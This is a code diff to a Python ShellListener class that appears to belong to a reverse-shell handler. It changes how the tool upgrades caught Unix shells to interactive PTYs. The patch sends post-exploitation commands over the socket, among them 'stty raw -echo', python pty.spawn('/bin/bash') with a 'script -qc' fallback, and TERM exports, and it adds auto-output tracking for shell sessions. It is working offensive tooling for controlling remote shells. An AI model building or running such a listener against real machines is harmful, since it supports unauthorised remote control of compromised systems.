@@ -131,13 +131,16 @@ class ShellListener:
             shell_db.append_output(sid, buffered)
         return "unix"
 
-    def _upgrade_shell(self, conn):
+    def _upgrade_shell(self, sid, conn):
         _dbg("[shell] attempting PTY upgrade...")
+        shell_db.set_auto_output(sid, 3.0)
         try:
             conn.sendall(b"stty raw -echo rows 50 cols 120 2>/dev/null; export TERM=dumb\n")
             time.sleep(0.1)
             conn.sendall(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null 2>/dev/null\n")
             time.sleep(0.4)
+            conn.sendall(b"export TERM=xterm; export SHELL=bash\n")
+            time.sleep(0.1)
             conn.sendall(b"stty rows 50 cols 120 2>/dev/null\n")
             time.sleep(0.1)
             _dbg("[shell] PTY upgrade commands sent")
@@ -149,7 +152,7 @@ class ShellListener:
         shell_os = self._detect_os(sid, conn)
         shell_db.set_os(sid, shell_os)
         if shell_os == "unix":
-            self._upgrade_shell(conn)
+            self._upgrade_shell(sid, conn)
         conn.settimeout(0.5)
         _dbg(f"[shell #{sid}] handler started (os={shell_os})")
         try:
@@ -174,11 +177,13 @@ class ShellListener:
                 pass
 
 
-def send_command(sid, cmd):
+def send_command(sid, cmd, auto=False):
     session = shell_db.get_session(sid)
     if not session or session["status"] != "connected":
         _dbg(f"[shell #{sid}] send_command failed: not connected")
         return False
+    if auto:
+        shell_db.set_auto_output(sid)
     q = session.get("cmd_queue")
     if q:
         _dbg(f"[shell #{sid}] queuing: {repr(cmd[:100])}")
